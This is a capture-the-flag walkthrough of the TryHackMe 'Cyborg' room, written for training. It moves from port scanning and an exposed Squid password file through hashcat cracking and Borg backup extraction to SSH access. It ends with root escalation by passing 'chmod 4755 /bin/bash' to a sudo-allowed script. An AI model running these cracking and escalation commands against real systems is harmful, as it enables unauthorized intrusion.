# Cyborg

Room: https://tryhackme.com/room/cyborgt8

A box involving encrypted archives, source code analysis and more.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/cyborgt8.md

## Overview

This walkthrough covers the path used to enumerate the target, recover a protected archive password, extract a Borg backup, obtain SSH access as `alex`, and escalate privileges to root through a misconfigured sudo backup script.

## Task Answers

| Question | Answer |
|---|---|
| Scan the machine, how many ports are open? | 2 |
| What service is running on port 22? | SSH |
| What service is running on port 80? | HTTP |
| What is the user.txt flag? | `[REDACTED_FLAG]` |
| What is the root.txt flag? | `[REDACTED_FLAG]` |

---

## Enumeration

Started with a full TCP version scan against the target.

```bash
root@ip-10-67-121-250:~# nmap -sV -p- [TARGET_IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-09 11:18 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for [TARGET_IP]
Host is up (0.00023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.55 seconds
```

Only two ports were open:

```text
22/tcp SSH
80/tcp HTTP
```

---

## Web Enumeration

While checking the web service, the following Squid configuration file was accessible:

```text
http://[TARGET_IP]/etc/squid/squid.conf
```

Contents:

```conf
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

The important line was:

```conf
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
```

This pointed to a password file:

```text
http://[TARGET_IP]/etc/squid/passwd
```

Contents:

```text
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

This looked like an Apache MD5 APR1 hash, commonly used with `.htpasswd` style authentication.

Username:

```text
music_archive
```

Hash:

```text
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

---

## Cracking the Apache APR1 Hash

The hash was saved to a file and cracked with Hashcat mode `1600`, which is used for Apache `$apr1$` MD5 hashes.

```bash
pingu@nootnoot:~/Downloads/THM$ hashcat -m 1600 hash.txt ~/wordlists/rockyou.txt
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

/sys/bus/pci/devices/0000:0f:00.0/hwmon/hwmon4/pwm1: No such file or directory

OpenCL API (OpenCL 2.1 AMD-APP (3581.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 9070 XT, 16192/16304 MB (13858 MB allocatable), 32MCU
* Device #2: AMD Radeon Graphics, 7776/15617 MB (6637 MB allocatable), 1MCU

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
==================================================================================================================================================
* Device #3: cpu-skylake-avx512-AMD Ryzen 7 7800X3D 8-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1756 MB

Dictionary cache hit:
* Filename..: /home/pingu/wordlists/rockyou.txt
* Passwords.: 14344383
* Bytes.....: 139923456
* Keyspace..: 14344383

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:[REDACTED_PASSWORD]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Sat May  9 19:56:00 2026 (0 secs)
Time.Estimated...: Sat May  9 19:56:00 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/pingu/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5638.3 kH/s (10.40ms) @ Accel:16 Loops:500 Thr:256 Vec:1
Speed.#2.........:   161.5 kH/s (8.43ms) @ Accel:8 Loops:1000 Thr:256 Vec:1
Speed.#*.........:  5799.8 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 135168/14344383 (0.94%)
Rejected.........: 0/135168 (0.00%)
Restore.Point....: 0/14344383 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: steve -> bustard
Candidates.#2....: bushman -> 143matt
Hardware.Mon.#1..: Temp: 37c Fan:  0% Util:  5% Core: 880MHz Mem:1258MHz Bus:16
Hardware.Mon.#2..: Temp: 39c Util:  0% Core: 600MHz Mem:3000MHz Bus:16

Started: Sat May  9 19:55:42 2026
Stopped: Sat May  9 19:56:02 2026
```

Recovered password:

```text
[REDACTED_PASSWORD]
```

This password was later useful for the backup archive.

---

## Extracting `archive.tar`

The downloaded file was named:

```text
archive.tar
```

First, it was extracted with `tar`:

```bash
pingu@nootnoot:~/Downloads/THM$ tar -xvf archive.tar
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

This did not extract normal user files directly. Instead, it produced this directory structure:

```text
home/field/dev/final_archive/
├── config
├── data/
├── hints.5
├── index.5
├── integrity.5
├── nonce
└── README
```

The README confirmed what it was:

```bash
pingu@nootnoot:~/Downloads/THM/home/field/dev/final_archive$ cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

So `tar` only unpacked the outer container. The contents were actually a Borg Backup repository.

---

## Moving to the AttackBox

Borg was not installed on the home computer, so the extraction was continued on the TryHackMe AttackBox.

On the AttackBox:

```bash
root@ip-10-67-121-250:~/Downloads# ls
archive.tar  owasp_zap_root_ca.cer
```

The archive was extracted again:

```bash
tar -xvf archive.tar
```

Then moved into the Borg repository:

```bash
cd home/field/dev/final_archive
```

The repo contained:

```bash
pingu@nootnoot:~/Downloads/THM/home/field/dev/final_archive$ ls
config  data  hints.5  index.5  integrity.5  nonce  README
```

---

## Confirming the Borg Repository

The config file included a Borg repository key:

```bash
pingu@nootnoot:~/Downloads/THM/home/field/dev/final_archive$ cat config 
[repository]
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
    L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
    2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
    8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
    daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
    oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
    eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
    T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
    vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
    SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
    UCH8bjZLfc1GFsundmVyc2lvbgE=
```

This confirmed that Borg needed the passphrase to unlock and extract the backup contents.

---

## Extracting the Borg Backup

The cracked password was used as the Borg passphrase.

```bash
export BORG_PASSPHRASE='[REDACTED_PASSWORD]'
borg list --short .
borg extract .::ARCHIVE_NAME
```

After extraction, the repository folder contained real files from Alex’s home directory:

```bash
root@ip-10-67-121-250:~/Downloads/home/field/dev/final_archive# find . -maxdepth 5 -type f
./index.5
./nonce
./README
./home/alex/Documents/note.txt
./home/alex/.bash_logout
./home/alex/Desktop/secret.txt
./home/alex/.profile
./home/alex/.bash_history
./home/alex/.dbus/session-bus/c707f46991feb1ed17e415e15fe9cdae-0
./home/alex/.bashrc
./hints.5
./data/0/1
./data/0/3
./data/0/4
./data/0/5
./integrity.5
./config
```

Interesting files:

```text
./home/alex/Documents/note.txt
./home/alex/Desktop/secret.txt
./home/alex/.bash_history
```

---

## Finding Alex’s Credentials

The note file contained credentials for Alex.

```bash
root@ip-10-67-121-250:~/Downloads/home/field/dev/final_archive# cat ./home/alex/Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:[REDACTED_PASSWORD]
```

Credentials found:

```text
Username: alex
Password: [REDACTED_PASSWORD]
```

The desktop secret file was checked too:

```bash
root@ip-10-67-121-250:~/Downloads/home/field/dev/final_archive# cat ./home/alex/Desktop/secret.txt
shoutout to all the people who have gotten to this stage whoop whoop!"
```

This looked like a message, not a password.

---

## Checking Alex’s Bash History

Alex’s backup `.bash_history` showed some useful clues:

```bash
root@ip-10-67-121-250:~/Downloads/home/field/dev/final_archive# cat ./home/alex/.bash_history
ls
cd ..
ls
mkdir alex
su field
rsync rsync://192.168.42.129/Backup
ls
subl /etc/rsyncd.conf
sudo subl /etc/rsyncd.conf
cd ..
ls
cd rsyncdata/
ls
touch hi.txt
sudo touch hi.txt
rsync rsync://localhost/
rsync rsync://localhost/backup
rsync rsync://localhost/Backup
sudo service restart rsync
sudo service rsync restart
rsync rsync://localhost/
rsync rsync://localhost/Backup
su field
```

Useful observations:

- `rsync` was used several times.
- There may have been a `Backup` rsync module.
- The user `field` appeared in the command history.
- The file `/etc/rsyncd.conf` was edited.

However, the Alex credentials were enough to continue directly over SSH.

---

## SSH as Alex

Using the recovered credentials, SSH access worked.

```bash
pingu@nootnoot:~/wordlists$ ssh alex@[TARGET_IP]
The authenticity of host '[TARGET_IP] ([TARGET_IP])' can't be established.
ED25519 key fingerprint is SHA256:hJwt8CvQHRU+h3WUZda+Xuvsp1/od2FFuBvZJJvdSHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[TARGET_IP]' (ED25519) to the list of known hosts.
alex@[TARGET_IP]'s password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.

alex@ubuntu:~$
```

---

## User Flag

The user flag was in Alex’s home directory.

```bash
alex@ubuntu:~$ cat user.txt
[REDACTED_FLAG]
```

---

## Privilege Escalation Enumeration

Checked sudo permissions:

```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Alex could run `/etc/mp3backups/backup.sh` as root without a password.

Checked the script permissions:

```bash
alex@ubuntu:~$ ls -la /etc/mp3backups/backup.sh
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
```

Then read the script:

```bash
alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
    case "${flag}" in 
        c) command=${OPTARG};;
    esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

The vulnerable section was:

```bash
while getopts c: flag
do
    case "${flag}" in 
        c) command=${OPTARG};;
    esac
done

cmd=$($command)
echo $cmd
```

The script accepts a `-c` argument and executes it as a command. Because sudo allows Alex to run this script as root, the supplied command is also executed with root privileges.

---

## Initial Root Shell Attempt

Running a shell through the script did result in a root prompt, but the shell behaved badly because the command was executed through command substitution.

```bash
sudo /etc/mp3backups/backup.sh -c /bin/bash
```

Result:

```bash
Backup finished
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root@ubuntu:/root# whoami
root@ubuntu:/root# id
root@ubuntu:/root# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@ubuntu:/root#
```

The prompt showed root, but command output was not displaying properly.

This happened because the script ran the command like this:

```bash
cmd=$($command)
```

So a shell launched that way was awkward and not fully interactive.

---

## Stable Root Shell with SUID Bash

Instead of trying to keep the bad shell, the script was used for a side effect: setting the SUID bit on `/bin/bash`.

```bash
sudo /etc/mp3backups/backup.sh -c "chmod 4755 /bin/bash"
```

After it finished, returned to Alex:

```bash
Backup finished

alex@ubuntu:~$
```

Then used Bash’s privileged mode:

```bash
/bin/bash -p
```

This gave a stable root shell:

```bash
bash-4.3# cd /root
bash-4.3# ls
root.txt
```

---

## Root Flag

There was one small typo first:

```bash
bash-4.3# cat root.xt
cat: root.xt: No such file or directory
```

Then the correct file was read:

```bash
bash-4.3# cat root.txt
[REDACTED_FLAG]
```

Root complete.

---

## Exploit Chain Summary

1. Nmap found SSH and HTTP open.
2. HTTP exposed Squid configuration files.
3. Squid config revealed the path to `/etc/squid/passwd`.
4. The password file contained an Apache APR1 hash for `music_archive`.
5. Hashcat cracked the hash and recovered the password.
6. The password unlocked a Borg backup repository inside `archive.tar`.
7. The Borg backup contained Alex’s home directory files.
8. `note.txt` exposed Alex’s SSH password.
9. SSH as Alex succeeded.
10. `user.txt` was read.
11. `sudo -l` showed Alex could run `/etc/mp3backups/backup.sh` as root without a password.
12. The script accepted `-c` and executed the supplied command.
13. Used the script to set SUID on `/bin/bash`.
14. Ran `/bin/bash -p` to get a stable root shell.
15. Read `/root/root.txt`.

---

## Key Lessons

### Exposed configuration files are dangerous

The web server exposed files under `/etc/`, including Squid configuration and password files. This leaked the authentication hash needed for the next stage.

### Hashes are not passwords, but weak passwords fall quickly

The leaked APR1 hash was crackable with a standard wordlist, giving access to the backup passphrase.

### Backups often contain sensitive data

The Borg backup contained a user’s home directory, including notes and shell history. This exposed credentials and useful operational clues.

### Sudo command whitelisting must be strict

Allowing a user to run a script as root is dangerous if the script accepts user-controlled commands. In this case, `backup.sh` directly executed the `-c` argument.

### Command substitution can create weird shells

The direct root shell worked, but behaved badly because the command was launched inside command substitution. Using the bug to set SUID on Bash produced a much cleaner root shell.
